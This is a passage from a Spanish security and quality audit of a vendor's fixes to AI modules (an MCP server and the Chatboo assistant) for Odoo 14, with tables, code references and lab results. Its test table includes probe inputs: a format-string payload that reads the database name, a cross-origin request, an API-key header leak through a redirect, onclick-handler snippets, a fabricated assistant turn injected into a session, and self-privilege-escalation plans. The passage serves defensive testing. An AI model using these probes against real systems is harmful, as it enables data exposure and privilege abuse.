| P-36 | 36 | Por `/mcp`: `result = '{0.cr.dbname}'.format(env)` y la misma cadena construida en ejecución | Rechazo o cadena vacía |
| P-17 | 17 | Servidor OpenAPI con `auth_type=custom_header`, `auth_header_name=apikey`, cuyo endpoint redirige (302) a otro host público que registre las cabeceras | La cabecera no llega al segundo host |
| P-61 | 61 | `/chatboo/sessions/save` con un turno de asistente inventado; turno siguiente | El modelo no lo ve (comprobar `prompt_data` en `ai.log`) |
| P-28 | 28 | `curl -X OPTIONS -H 'Origin: https://ajeno.invalid'` a `/mcp`; después `POST` con el mismo `Origin` | OPTIONS 200 con `*` (core de 14); POST 403 |
| P-60 | 60 | Inventario de manejadores `data-*` del cliente de Chatboo; corpus de su check (`<unknown onclick=…>`, `**res_partner**`) y `<button data-copy=…>` en una respuesta | Sin ejecución ni acción no pedida |
| P-40 | 40 | Proveedor caído (503) en el chat | Sin host, puerto, URL ni cuerpo |
| P-6 | 94 | Los 5 casos del parche 6 con imagen, más ficheros del clip y SVG; `pg_stat_activity` | Sin conexiones colgadas |
| P-97 | 97 | AI Administrator sin Ajustes: vaciar `group_ids` de una acción y crear una con `apply_method` a un método de otro modelo | Rechazo; hoy se espera que se guarde |
| P-98 | 98 | PDF, Word, clip y SVG en el chat; `SELECT res_model, res_id FROM ir_attachment` de los nuevos | Enganchados a la sesión |
| P-82 | 82 | Prueba 4 bis de E2 | El adjunto ajeno no se borra (hoy se espera que sí) |
| P-01 | 01/02 | AI Administrator sin Ajustes: plan para darse y para quitar a otro un grupo de gestión no cúspide | Decisión de criterio (con 3.1.879 pasa; con el parche 12 no) |
| P-6 (ampliada) | 94 | Ficha en §5.6, PNS-94: los 5 casos más (a) dos CSV por el clip, (b) SVG en línea, (c) PDF por `fulfill_client_export`, (d) recargar con un turno en marcha | Ver §5.6 |
| P-26 | 26 | Ficha en §5.6, PNS-26: herramienta de prueba que escribe por ORM y falla, seguida de otra que confirma | Ver §5.6 |
| P-70 | 70 | Ficha en §5.6, PNS-70: vista gráfico → Chatboo con gráfico → vista gráfico y tablero de Contabilidad | Ver §5.6 |
| P-29 | 29 | Ficha en §6.1, PNS-29: (a) tope y borrado de logs; (b) `month_usage` por RPC | Ver §6.1 |
| P-18 | 18 | Ficha en §6.1, PNS-18: local con «No external failover» sin visión y externo activo; turno con imagen | Ver §6.1 |
| P-20 | 20 | Ficha en §6.1, PNS-20: Revisar sin Confirmar en dos importaciones con «Sobrescribir» | Ver §6.1 |
| P-37 | 37 | Ficha en §6.1, PNS-37: fila del diario reescrita por un AI Administrator y cron de la papelera | Ver §6.1 |
| P-37b | 37 | Ficha en §6.1, PNS-37: AI Writer con escritura y sin borrado; plan de borrado y cron | Ver §6.1 |
| P-8a | M13 | Ficha en §8.7, M13 | Ver §8.7 |
| P-8b | M10 | Ficha en §8.7, M10 | Ver §8.7 |
| P-8c | M1 | Ficha en §8.7, M1 | Ver §8.7 |
| P-8d | M2 | Ficha en §8.7, M2 | Ver §8.7 |
| P-8e | F1 | Ficha en §8.7, F1 | Ver §8.7 |
| P-8f | M11 | Ficha en §8.7, M11 | Ver §8.7 |
| P-8g | M12 | Ficha en §8.7, M12 | Ver §8.7 |
| P-8h | D1 | Ficha en §8.7, D1 | Ver §8.7 |

### 4.4 «Checks para Seges» del fabricante que hay que repetir

Todas las de §4 de su informe, con estas notas:

- **Repetibles con nuestros tests o scripts:** PNS-83 (parte RPC), PNS-90, PNS-85, PNS-91, PNS-82
  (con la adaptación de la prueba 2), PNS-01/02, PNS-07 (añadiendo `_claim_execute` y
  `_execute_plan_with_timeouts`).
- **Repetibles con un script nuevo del mismo estilo (`call_kw`, `/mcp` sin LLM, `curl`):** PNS-92,
  PNS-30, PNS-37, obs. 8, PNS-19, PNS-33, obs. 2, PNS-89, PNS-28, PNS-61, PNS-55, PNS-62, PNS-36,
  PNS-54.
- **En la interfaz o el chat:** PNS-84 (con `SELECT`), PNS-20, obs. 3, PNS-60, PNS-65, PNS-35,
  PNS-66, PNS-16, PNS-59, PNS-17, PNS-86, PNS-40.
- **No repetibles tal como están:** PNS-83 «fila de la IP real» (no hay ninguna ruta que llame a
  `_redeem_key_pin` en los tres módulos); PNS-22 (no hay herramienta `is_write` distinta de
  `relaxaicode`).
- **Insuficientes:** PNS-54 (su prueba no toca `action_confirm_and_execute` ni `/verification/pending`)
  y PNS-19 (su prueba solo pide el modelo directamente).

## 5. Arquitectura y fallos

Mismas columnas que §2.1. «Rama Seges»: parche o entrega del
[plan](../pendiente/plan_correccion_pns_ai.md), o la decisión de
[pns_ai_decisiones.md](../pendiente/pns_ai_decisiones.md) a la que afecta. Rutas relativas a
`_fabricante/3.1.879/`; las del core, a `/opt/odoo-src/14.0/odoo/`. Las de nuestra rama se marcan
«(rama)».

#### §5.1 Bloqueantes

| PNS | Grav. | Fabricante | 3.1.879 (archivo:línea) | Resultado | Rama Seges | Comparación | Checks para Seges / reproducible |
|---|---|---|---|---|---|---|---|
| PNS-81 | Alta | Resuelto, `pns_base` 1.2.36 / `pns_ai_mcp` 3.1.830 | Los cuatro fallos, corregidos (§2.2, parches 1-4). `ast_literal` lee los nodos de 3.7 y 3.8+ (`pns_ai_mcp/controllers/validators_base.py:285-297`). **Resto:** `pns_ai_chatboo/utils/skill_capture_compose.py:319-325` sigue con `isinstance(..., ast.Constant)` a secas (§2.4) | **PARCIAL** (funcional, sin efecto de seguridad) | Parches 1-4 (N2; permanentes por N12) | Equivalente en los cuatro fallos. La afirmación «las degradaciones en 3.7 también quedan resueltas» no se cumple en Chatboo | `odoo-dev 14 paridad pns_base,pns_ai_mcp,pns_ai_chatboo` (fase 3): sí. Sus `unit_tests/test_odoo14_python37.py` y `pns_base/unit_tests/test_pdf_io.py` **no vienen en el paquete** (§1.4) |
| PNS-94 | Alta | Resuelto, `pns_ai_chatboo` 2.1.511 | `rollback` antes de las tres llamadas a `_finalize` de `_process` (`pns_ai_chatboo/models/chatboo_async_request.py:302-305, 477-485, 493-494`; método `:544-559`); pantalla en cursor corto con `lock_timeout` 3 s (`:345, 527-538`); commit previo fallido termina el turno (`:294-306`); `_finalize` con `lock_timeout` 10 s, `savepoint` y cierre en `error` si es `55P03` (`:37-46, 654-701`), y la vía de respaldo también (`:705-715`); `update_last_used` con `SKIP LOCKED` (`pns_ai_chatboo/models/chatboo_session.py:746-753`); `/chatboo/sessions/save` con `lock_timeout` (`pns_ai_chatboo/controllers/chatboo.py:435`) | **REQUIERE PRUEBA** | Parche 6 (N2); fondo en E5 | Cubre más que el parche 6 (tercera llamada y esperas acotadas: un lock residual ya no cuelga el hilo, como mucho 10 s) y buena parte de E5. No restaura `towrite`/`tocompute` (nosotros sí). `_on_crash` no es un riesgo (detalle). Los conflictos de serialización de E2: probablemente desaparecen sobre el job, por un efecto lateral; la causa y PNS-98 siguen (detalle) | Sus 5 casos: sí (prueba P-6 de §4, ampliada en el detalle) |
| PNS-93 | Media | Resuelto, `pns_ai_mcp` 3.1.831 | `extra_content` de cada delta copiado al `tool_call` (§2.2, parche 5); combinación por niveles `_merge_extra` (`pns_ai_mcp/lib/llm/drivers/openai_driver.py:193-201`); reparto de deltas sin `index` `_call_row` (`:173-190`) | **VERIFICADO** (código) | Parche 5 (N2) | Equivalente (§2.2); además reparte las llamadas paralelas sin `index` | Su check (Gemini 3 por protocolo `openai`, varias rondas y segundo turno): sí, en staging con Gemini. No lo han probado contra Gemini real |

#### §5.2 Pérdida de datos al actualizar

| PNS | Grav. | Fabricante | 3.1.879 (archivo:línea) | Resultado | Rama Seges | Comparación | Checks para Seges / reproducible |
|---|---|---|---|---|---|---|---|
| PNS-87 | Baja | Resuelto, 3.1.836 | Sin parámetro (o con 0 o no numérico) `_cron_purge_old_logs` no borra (`pns_ai_mcp/models/ai_log.py:904-929`); campo en Ajustes (`pns_ai_mcp/models/res_config_settings.py:62-64`); `ai_provider_usage_day` fuera de `FOSSIL_TABLES` (`pns_ai_mcp/utils/schema_fossils.py:17-31`) y `ai_log.agent_id` fuera de `LEFTOVER_COLUMNS` (`:46-63`) | **VERIFICADO** | E6 (sin código); N1 / D13 | — | Sí (BD con filas de más de 30 días). Nota: el tope de gasto nuevo se calcula desde `ai.log` (§6, PNS-29): una retención menor de un mes lo deja sin efecto |
| PNS-88 | Baja | Resuelto, 3.1.837 | `rename_leftover_xmlids` (`pns_ai_mcp/utils/schema_fossils.py:100-114`) en `ai.schema.fossil.init()` (`pns_ai_mcp/models/ai_schema_fossil.py:34`) renombra los 27 de `migrations/3.1.519` (`schema_fossils.py:69-97`). **Faltan los 11 de `migrations/3.1.518/pre-migrate.py:13-25`** (familia `ai.safe.operation`: reglas, menús, acciones, vistas y accesos) | **PARCIAL** | E6 (sin código; N1: ningún entorno viene de 3.1.486) | — | Su check (regla `mcp_log_*`): pasaría. Con `mcp_safe_operation_user_rule` fallaría (detalle) |
| Obs. 5 | — | Resuelto, `pns_ai_chatboo` 2.1.513 | Sin valor, `_cleanup_old_sessions` no borra (`pns_ai_chatboo/models/chatboo_session.py:2023-2044`); Ajustes enseña 0 (`pns_ai_chatboo/utils/chatboo_product_icp.py:124-141`); la semilla `chatboo_icp_data` ya no está en el módulo (Grep, también en el manifiesto) | **VERIFICADO** | N1 / D35 | — | Sí. Nota: una BD que ya tenía el parámetro a 30 lo conserva (comportamiento anunciado). Un AI Administrator puede cambiar la retención desde el agente de Chatboo (`pns_ai_chatboo/models/ai_agent.py:42-48, 111-116` → `utils/chatboo_product_icp.py:183-185`, en `sudo`); ya era así en 3.1.782 (`ai_agent.py:101`) |
| PNS-68 | Media | Resuelto, `pns_ai_chatboo` 2.1.513 | 2.1.296, 2.1.300 y 2.1.343 usan `unlink_named_factory_skills` (`pns_ai_chatboo/migrations/2.1.296/post-migrate.py:26-32`, `2.1.300/post-migrate.py:26-32`, `2.1.343/post-migrate.py:25-33`), que filtra `owner_id` vacío y exige superusuario (`pns_ai_mcp/models/ai_skill.py:2268-2290`, `_require_bootstrap` `:1490-1500`); reserva con filtro de dueño | **VERIFICADO** | — | — | Revisión de código: sí. Nota: en Odoo 14 estas migraciones no se ejecutan (versión de tres partes, `odoo/modules/migration.py:108-111`); la reserva de `2.1.301/post-migrate.py:31-38` no filtra dueño, pero solo se alcanza sin el helper |
| PNS-76 | Baja | Resuelto, 3.1.837 | `_drop_acl_security_factory_fossil` recorre todo agente `origin='module'` con marca por agente (`pns_ai_mcp/models/ai_agent.py:250-273`), llamado en la carga (`:230-235`) | **VERIFICADO** | — | — | Sí (agente de Chatboo sin `acl_security` tras actualizar) |

#### §5.3 Transacciones y concurrencia

| PNS | Grav. | Fabricante | 3.1.879 (archivo:línea) | Resultado | Rama Seges | Comparación | Checks para Seges / reproducible |
|---|---|---|---|---|---|---|---|
| PNS-26 (resto) | Alta | Resuelto, 3.1.842 | `/mcp`: `rollback` si la herramienta falla (`pns_ai_mcp/controllers/main.py:1357-1360`). Motor: **no hay `rollback`** (contra lo que dice la ficha), sino `SAVEPOINT` en SQL directo por herramienta (`pns_ai_mcp/utils/engine_tool_run.py:323-357`) e `invalidate_cache` al fallar (`:256-260, 306-321`) | **PARCIAL** | — (§7, PNS-26 parte) | — | Su check necesita una herramienta que escriba por ORM sin commit y falle; las de fábrica que escriben son de la Caja B (con commit). REQUIERE PRUEBA en laboratorio (detalle) |
| PNS-24 (resto) | Alta | Resuelto, 3.1.845 | `module_update_alone_error` (`pns_ai_mcp/utils/module_update_heal.py:113-128`) al validar (`pns_ai_mcp/controllers/safe_plan.py:195-198`) y al ejecutar (`:796-799`) | **VERIFICADO** | — | — | Sí (plan con `module.update` y otro paso, o dos `module.update`) |
| PNS-32 (resto) | Media | Resuelto, 3.1.846 | `pg_try_advisory_xact_lock` y relectura del sello (`pns_ai_mcp/hooks.py:246-278`); `active` no se pisa (`pns_ai_mcp/models/ai_context_disk.py:712-714`; `pns_ai_mcp/models/ai_skill.py:2140-2146`); filas con dueño intactas (`ai_skill.py:2121-2129`); retirada solo si hay ficheros (`ai_skill.py:2236-2241`) | **VERIFICADO** (código) | D17 / D38 | — | Apagar y actualizar: sí. Dos workers: REQUIERE PRUEBA (nota en el detalle). Sigue pisando el texto de las filas de fábrica editadas (por diseño: «el disco manda»; D38) |

#### §5.4 Parches globales

| PNS | Grav. | Fabricante | 3.1.879 (archivo:línea) | Resultado | Rama Seges | Comparación | Checks para Seges / reproducible |
|---|---|---|---|---|---|---|---|
| PNS-42 | Media | Resuelto, `pns_base` 1.2.37 / 1.2.47 | Clase `o_pns_view` en la raíz de las vistas con XML ID `pns*` (`pns_base/models/ir_ui_view_patch.py:54-74`) desde un `fields_view_get` **nuevo sobre `base`** (`:503-514`); CSS solo bajo `.o_pns_view` (`pns_base/static/src/css/pns_required_readonly.css:4-6`); el aviso, solo si `_pnsIsOurView` (`pns_base/static/src/js/pns_invalid_fields_dedupe.js:78-110`) | **VERIFICADO** (alcance) | PB-2 | — | Sí (formulario estándar con obligatorio vacío). Siguen globales el `BasicController.include` (delega en `_super` fuera de las vistas PNS, `:100-103`) y el `fields_view_get` nuevo (§5.7) |
| PNS-43 (resto) | Baja | Resuelto, `pns_base` 1.2.37 | Solo descarta el duplicado si las dos filas son de un módulo `pns*` (`pns_base/models/ir_translation.py:88-111`) | **VERIFICADO** | PB-7 | — | Sí (`--i18n-overwrite` de un módulo ajeno) |
| PNS-31 (resto) y obs. 4 | Media | Resuelto, 3.1.847 | `_process_ondelete` solo para modelos de módulos `pns*` (`pns_ai_mcp/models/ir_model_fields_selection.py:23-60`); `Root.get_request` sigue igual, solo POST JSON a `/mcp*` (`pns_ai_mcp/http_patch.py:18-39`); la mesa del PIN solo arranca con `session.pns_is_ai_admin` (`pns_ai_mcp/static/src/js/key_pin_desk_v14.js:525-550`; `pns_ai_mcp/models/ir_http.py:13-16`); filtro de origen solo en formularios con la barra (`pns_ai_mcp/static/src/js/ai_agent_origin_filter_v14.js:367-401`); `set_values` solo escribe la política si cambia (`pns_ai_mcp/models/res_config_settings.py:334-342`) | **VERIFICADO** | D9 | — | Sí (interno sin grupos de IA: sin sondeo de la mesa). El filtro de origen pasa a ser un `FormRenderer.include` global, sin efecto fuera de su formulario (§5.7) |
| PNS-72 (resto) | Baja | Resuelto, `pns_ai_chatboo` 2.1.519 | jsPDF, autotable, html2canvas, Chart.js y ECharts se cargan al abrir el chat (`pns_ai_chatboo/static/src/js/chatboo_heavy_libs.js:12-36`, llamado en `chatboo_systray.js:383`); `assets.xml:6-32` ya no los lleva; icono del systray desde `session_info` (`pns_ai_chatboo/models/ir_http.py:4-29`; `chatboo_systray.js:48`); `check_health` solo desde el componente del chat (`chatboo_component_v2.js:1624`) | **VERIFICADO** | D43 | — | Sí (red del navegador al cargar el backend). Siguen en `web.assets_backend` unos 20 JS propios de Chatboo para todo interno (`assets.xml:12-32`) |
| PNS-70 | Media (**Alta** desde el 23/10/2026) | Resuelto, `pns_ai_chatboo` 2.1.519 | El chat usa su copia: `ChartLib` vía `bindEngines` (`pns_ai_chatboo/static/src/js/chatboo_charts.js:36-42, 1636-1640, 2006`; `chatboo_heavy_libs.js:28-33`). **Resto:** al cargarse, `chart.umd.min.js` (Chart.js 4.4.8, `:8`) deja su versión en `window.Chart`, que es la que usan las vistas gráfico de Odoo 14 (detalle) | **PARCIAL** | D43 | — | Su check (otra Chart.js en `window.Chart`) sí. Caso inverso confirmado en P-70 (fase 3, §5.6) |

#### §5.5 Conformidad y deuda

| PNS | Grav. | Fabricante | 3.1.879 (archivo:línea) | Resultado | Rama Seges | Comparación | Checks para Seges / reproducible |
|---|---|---|---|---|---|---|---|
| PNS-39 (resto) | Media | Resuelto, 3.1.848 | 202 en notificaciones (`pns_ai_mcp/controllers/main.py:619, 724, 930`); 401 con clave inválida (`:462, 478, 681, 697`); `isError: true` (`pns_ai_mcp/controllers/relaxaicode_replies.py:132, 165`) | **VERIFICADO** | D20 | — | Sí, con `curl` |
| PNS-40 (resto) | Media | Resuelto, 3.1.848 | `temperature_for_inference` respeta 0 (`pns_ai_mcp/models/ai_provider.py:946-951`), usado en `ai_provider.py:938`, `models/ai_execution_engine.py:392` y `utils/engine_turn_messages.py:158`; `max_completion_tokens` para `o1/o3/o4/gpt-5` (`lib/llm/drivers/openai_driver.py:23-28`, usado en `:541`) | **VERIFICADO** | D11 | — | Sí (proveedor con `temperature = 0`; mirar la petición en `ai.log`) |
| PNS-29 (parte) | Media | Resuelto, 3.1.848 | `normalize_usage` suma `cache_creation_input_tokens` al prompt y lo guarda aparte (`pns_ai_mcp/utils/llm_usage.py:114-148`) | **VERIFICADO** | D12 | — | Solo con Anthropic y caché de prompt (no usado en Seges) |
| PNS-95 (y PNS-46) | Baja | Resuelto, 3.1.848 | `_fmt_number` con `Decimal` y `ROUND_HALF_UP` (`pns_ai_mcp/utils/relaxaicode_render.py:331-342`), usado en tablas (`:1090`) y exportaciones (`utils/artifact_export.py:2722`) | **VERIFICADO** (tablas y ficheros) | «Después» (funcional) | — | Tabla: sí. El texto lo escribe el modelo: REQUIERE PRUEBA (prueba 11 del staging del 16/10 con un usuario `es_ES`) |
| PNS-49, PNS-74 y obs. 12 | Baja | Resuelto, 3.1.849 / 2.1.520 | Sin `moe_controller.py` ni `ollama_driver.py` (Glob); sin `register_llm_driver('ollama'`, `chatboo_floating_transfer_history`, `mail_service`, `chatboo_has_access`, `detect_dangerous_operations` ni `_saveRawForTemplate` (Grep) | **VERIFICADO** | — | — | Sí (revisión de código) |
| PNS-50 y PNS-77 | Baja | Resuelto, 3.1.848 / 2.1.520 | `pns_ai_mcp/tests/__init__.py:27, 30, 32` importa los tres; `TransactionCase` con `standard` (`tests/test_change_journal.py:12-13`, `test_session_download.py:18-19`, `test_presentation_mode.py:16-17`). **Chatboo:** ni `tests/` ni `unit_tests/` en el paquete (Glob); `common/tests/__init__.py` no existe | **PARCIAL** | ET | — | `pns_ai_mcp`: sí (`odoo-dev 14 tests`). Chatboo: no verificable (sus negativos dicen estar en `unit_tests/`, que no se entregan). En nuestra rama sí hay `pns_ai_chatboo/tests/` (parche 11) |
| PNS-73 | Baja | Resuelto, 2.1.520 | Chat flotante a `z-index: 1039` (`pns_ai_chatboo/static/src/css/chatboo_floating.css:1343`; `chatboo_dashboard.css:172`; `static/src/js/chatboo_systray.js:445`); sin campos `static` de clase (Grep) | **VERIFICADO** | — | — | Sí, en la interfaz. Nota: otras capas siguen por encima del modal (1050): visor de PDF a 20000 (`chatboo_pdf_viewer.css:10`), tarjetas a 20000 (`chatboo_choice_list.js:23`; `chatboo_component_v2.js:2195`) y una a 1060 (`chatboo_floating.css:1500`) |
| PNS-38 | Media | Resuelto, 3.1.848 | `system_prompt.xml` 4.19 (`pns_ai_mcp/ai/contexts/core/system_prompt.xml:7`): `fetch_url` no por defecto (`:21`) y `module.update` solo si se pide (`:143`); `email.md` con `notification_status` (`ai/contexts/domain/email.md:15, 53-67`; existe en 14, `addons/mail/models/mail_notification.py:27`); `partners.xml:38` no inventa `customer_id` | **VERIFICADO** | — | — | Sí (revisión de los contextos) |

### 5.6 Detalle de PARCIAL, NO CORREGIDO y REQUIERE PRUEBA

#### PNS-94 (Alta) — REQUIERE PRUEBA: el bloqueo, corregido por código; los conflictos de E2, por un efecto lateral

- **Lo corregido (código):** ver la fila. Frente al parche 6, 3.1.879 suelta el cursor también antes
  de la tercera llamada (commit previo fallido, `chatboo_async_request.py:302-305`) y acota todas las
  esperas: aunque quedara un lock en el cursor del hilo, `_finalize` esperaría como mucho 10 s
  (`:657`) y cerraría el job en `error` con el mensaje de «conversación ocupada» (`:688-701`). Cubre
  así la mayor parte de E5 (`lock_timeout`, no tragar un commit fallido, cerrar el job).
- **`_on_crash` (observación de la pasada A, §3): no se da.** `_on_crash` → `_finalize`
  (`chatboo_async_request.py:120-121`) solo se llama desde `_record_crash`
  (`pns_ai_chatboo/models/chatboo_job.py:229-251`), y este desde `_runner` **después** de salir del
  `with db_registry.cursor()` del hilo (`:203-222`). Al salir con excepción, el cursor se cierra
  (`odoo/sql_db.py:148-153`) y `_close` hace `rollback` (`:368-392`): no queda ningún lock del turno.
  El cursor desde el que se llama (`chatboo_job.py:248`) no ha escrito nada antes. La pasada A queda
  corregida en este punto.
- **Conflictos de serialización del staging de E2 (clip y SVG): causa probable.** Análisis estático
  sobre nuestra rama, que es la que se probó (verificación, «Staging — entrega E2», «Observaciones»):
  - En Odoo 14 todos los entornos de un hilo comparten la caché y las escrituras pendientes
    (`towrite`), sea cual sea su cursor (`odoo/api.py:449-477`; `Environments.towrite`, `:765-773`).
    El `commit` de un cursor vuelca con ese cursor **todo** lo pendiente
    (`odoo/sql_db.py:65-79, 449-457`; `odoo/models.py:5495-5500`).
  - En `_finalize` de la rama, `job.write(vals)` (`pns_ai_chatboo/models/chatboo_async_request.py:922`
    (rama)) queda pendiente. Al guardar los ficheros del clip (`_persist_turn_files`) o los SVG
    (`persist_inline_svgs_from_html`), `persist_turn_file` abre otro cursor y hace commit
    (`_run_on_committed_cursor`, `pns_ai_mcp/utils/session_download.py:365-392`): ese commit escribe y
    confirma el estado final del job fuera de la transacción de `_finalize`. Después `_finalize`
    escribe `done_meta` (`:945` (rama)) y confirma (`:949` (rama)) con una instantánea anterior:
    «could not serialize access due to concurrent update». Encaja con lo observado: el fallo al escribir
    `done_meta` y el job en `done` aunque `_finalize` falló.
- **¿Lo resuelve 3.1.879?** No toca la causa: `_run_on_committed_cursor` es idéntico (3.1.782
  `:373-400`, 3.1.879 `:365-392`) y la persistencia de ficheros y SVG tampoco cambia
  (`chatboo_async_request.py:1050-1093, 1208-1234`). Lo que cambia es que `with cr.savepoint()`
  (`:665`) vuelca `job.sudo().write(vals)` en el cursor de `_finalize` al entrar
  (`odoo/sql_db.py:113-121`). Cuando llega el commit del cursor de ficheros, el job ya no está
  pendiente: el conflicto sobre `done_meta` **no debería repetirse**, pero por un efecto lateral.
  Queda:
  1. Cualquier escritura que siga pendiente cuando se guarda un fichero se confirma fuera de la
     transacción de `_finalize`. Si fuera del job (ya bloqueado por `_finalize` desde `:665`), el
     cursor de ficheros esperaría a `_finalize` en el mismo hilo **sin** `lock_timeout` (el
     `SET LOCAL` solo vale para el cursor de `_finalize`): el bloqueo original. En el tramo actual
     (`:1141-1183`) no se ve ninguna escritura pendiente; depende de que siga así.
  2. **PNS-98 sigue** para clip y SVG por otra vía: el adjunto creado en el cursor aparte no es visible
     para `_finalize` (instantánea anterior), y la reclamación lo descarta (§3, PNS-98).
  3. Si `_save_to_session` falla dentro del `savepoint` por algo que no es `55P03`, el job se confirma
     en `done` sin el turno en la sesión ni `session_saved` (`:688-695`): se ve en vivo, no al recargar.
  4. `update_last_used`: `FOR UPDATE SKIP LOCKED` evita esperar, pero en REPEATABLE READ no evita el
     40001 si la fila cambió después de la instantánea de la petición (`chatboo_session.py:749-753`).
     El conflicto de `last_used_date` visto en R6 puede seguir en el log (sin efecto visible).
- **Prueba (P-6 de §4, ampliada):** los 5 casos del parche 6 con imagen y, además, (a) un turno con dos
  CSV por el clip, (b) una respuesta con SVG en línea, (c) un PDF por `fulfill_client_export`, y (d)
  recargar el chat con un turno en marcha. Esperado si está bien: log sin «_finalize fresh-cursor
  failed» ni «could not serialize access»; `pg_stat_activity` sin «idle in transaction» ni
  `wait_event_type = 'Lock'` tras cada turno; job en `done` con `session_saved` en `done_meta`; el turno
  en la sesión tras recargar. `SELECT id, res_model, res_id FROM ir_attachment` de los adjuntos nuevos:
  hoy se espera `res_model` vacío en clip, SVG y PDF (PNS-98).
- **Resultado (fase 3, 23/10/2026):** P-6 ampliada **sin bloqueos**. En los 11 casos ejercitados (23
  jobs, incluido un 429 real del proveedor): todos los jobs en `done` con `session_saved`, el turno en
  la sesión, `pg_stat_activity` limpio y ningún «_finalize fresh-cursor failed». El **punto 4** se
  observó **una vez**: un «could not serialize access» en `update_last_used` al cargar dos veces la
  sesión 20 ms después de que un turno la confirmara (caso c). Una de las dos cargas devolvió
  `status: error` y la otra fue bien; no quedó nada colgado. Los puntos 1 y 3 no se dieron. PNS-98,
  confirmado (§3). Detalle: `fase3_lab_pns_ai_3879.md`, parte 2.

#### PNS-81 (Alta) — PARCIAL: queda una degradación en Chatboo

- Los cuatro fallos están corregidos (§2.2). La ficha afirma además que todo
  `isinstance(nodo, ast.Constant)` se trata con `ast_literal`; en `pns_ai_chatboo` queda
  `skill_capture_compose.py:319-325` (§2.4 y §3, «Compatibilidad — degradación nueva»). Sin efecto de
  seguridad. Confirmación definitiva: `odoo-dev 14 paridad` y la batería en la fase 3.

#### PNS-88 (Baja) — PARCIAL: faltan los renombrados de `ai.safe.operation`

- `XMLID_RENAMES` (`utils/schema_fossils.py:69-97`) reproduce `migrations/3.1.519/pre-migrate.py:13-41`
  (27 XML ID de `ai.log`, `ai.context` y `ai.change.journal`), pero no
  `migrations/3.1.518/pre-migrate.py:13-25`: `mcp_safe_operation_user_rule`,
  `mcp_safe_operation_admin_rule`, `menu_mcp_safe_operation(_admin)`,
  `action_mcp_safe_operation(_admin)`, las tres vistas y los dos accesos. Los 38 de PNS-88 son
  27 + 11. Una BD que venga de antes de 3.1.518 sigue perdiendo las personalizaciones de esos 11 (la
  regla de registro de las operaciones supervisadas, entre ellas).
- **Alcance en Seges:** ninguno hoy (N1 y E6: ninguna BD viene de 3.1.486; staging y LIYBEN ya pasaron
  ese `-u`). Solo cuenta si apareciera una BD anterior.

#### PNS-26 (resto, Alta) — PARCIAL: el motor no deshace las escrituras diferidas del ORM

- `/mcp` hace `rollback` del cursor de la petición (`controllers/main.py:1357-1360`): cubierto.
- El motor no hace `rollback`: abre un `SAVEPOINT` en SQL directo por herramienta
  (`utils/engine_tool_run.py:323-357`) y, si falla, invalida la caché (`:256-260, 306-321`). En Odoo 14:
  - `write()` deja los valores en `towrite` hasta el siguiente flush; un `SAVEPOINT` en SQL directo no
    vuelca antes (sí lo hace `cr.savepoint()`, `odoo/sql_db.py:113-121`);
  - `invalidate_cache()` sin argumentos vacía la caché, no `towrite` (`odoo/models.py:5773-5782`); eso
    solo lo hace `Environment.clear()` (`odoo/api.py:628-635`).
  - Consecuencias: (1) lo que la herramienta fallida escribió sin volcar sobrevive al `ROLLBACK TO
    SAVEPOINT` y se volcará después; (2) lo que estaba pendiente de antes y se volcó durante la
    herramienta se deshace, y ya no está en `towrite`: se pierde sin error.
- **Efecto práctico:** en Chatboo el cursor del turno se deshace entero antes de `_finalize`
  (`pns_ai_chatboo/models/chatboo_async_request.py:544-559`); solo importa si algo confirma ese cursor
  durante el turno: los `commit()` de la Caja B sobre el cursor de la petición
  (`models/safe_operation.py:918, 927, 1325, 1424, 1468`). Gravedad del resto: Baja.
- **REQUIERE PRUEBA** solo en laboratorio, con una herramienta de prueba que escriba por ORM y lance una
  excepción, seguida en el mismo turno de una herramienta que confirme: el registro no debe quedar
  modificado.

#### PNS-70 (Alta) — CONFIRMADO en 3.1.879: Chart.js 4 en `window.Chart` rompe gráficos de Odoo al abrir el chat

- **Estado (23/10/2026):** de PARCIAL a **CONFIRMADO** en 3.1.879 por P-70 en la fase 3. Severidad
  **Alta** (antes Media; decisión de Sergio).
  - **3.1.782 (rama `14.0-pns-ai-correcciones`, LIYBEN y staging):** `pns_ai_chatboo/views/assets.xml:22`
    (rama) carga `chart.umd.min.js` (Chart.js 4.4.8, hace `window.Chart = …`) dentro de
    `web.assets_backend`. Comprobado por Sergio en el staging `pns_demo` (parches 1 a 12, 23/10/2026,
    consola del navegador): con F5 en Contactos y el chat cerrado, `window.Chart` es la 4.4.8; tras
    abrir Ventas → Análisis y el tablero de Facturación sigue siendo la 4.4.8 (Odoo no recarga su
    2.x), y aun así la vista gráfico (también al cambiar de tipo) y el tablero se pintan bien, sin
    errores en la consola. Sin efecto observado en los gráficos de Odoo.
  - **3.1.879:** solo al abrir el chat (`chatboo_heavy_libs.js:12-33`, en `VENDOR` aunque el motor
    configurado sea `echarts`). Con F5 vuelve la 2.x hasta que se abre otra vez el chat.
- **Resultado de P-70:** tras abrir Chatboo, `window.Chart` pasa de 2.x a 4.4.8. En Ventas → Análisis
  la vista gráfico se dibuja, con errores «Invalid scale configuration for scale: xAxes/yAxes» en cada
  cambio de tipo; en el tablero de Facturación los gráficos de los diarios no cargan bien. Detalle:
  `fase3_lab_pns_ai_3879.md`, parte 2 (paso 3).
- **Sin explicar:** lo observado no casa con el análisis estático de abajo (carga diferida de la 2.x de
  Odoo con `ajax.loadJS`): según él, la 3.1.782 también debería romper los gráficos de Odoo, y en el
  staging no lo hace. Tampoco está claro por qué 3.1.879 falla. Se investiga al preparar el parche.
- **Corrección:** en la rama nueva, sin pisar `window.Chart`. La condición 3 de N12 se cierra al repetir
  P-70 con ese parche.

Análisis estático original (22/10/2026):

- Odoo 14 carga su Chart.js 2.x solo cuando hace falta, con `ajax.loadJS` (vista gráfico,
  `addons/web/static/src/js/views/graph/graph_view.js:26`; tablero de diarios,
  `fields/basic_fields.js:3067`), y lo usa como global (`graph_renderer.js:841, 896, 961`;
  `basic_fields.js:3130`). `loadJS` no vuelve a cargar una URL ya cargada
  (`addons/web/static/src/js/core/ajax.js:185-197`).
- Chatboo carga después `chart.umd.min.js` (Chart.js 4.4.8, `:8`) con el mismo `loadJS`
  (`chatboo_heavy_libs.js:24-27`). Secuencia: vista gráfico → abrir el chat → volver a una vista gráfico.
  `window.Chart` es ya la 4.4.8 y Odoo no la recarga: sus gráficos se pintarían con una API distinta
  (Chart.js 2 y 4 no son compatibles). Antes (3.1.782) el que se rompía era el chat; ahora podría
  romperse Odoo.
- **REQUIERE PRUEBA (P-70):** Ventas → Análisis (vista gráfico); abrir Chatboo y pedir un gráfico;
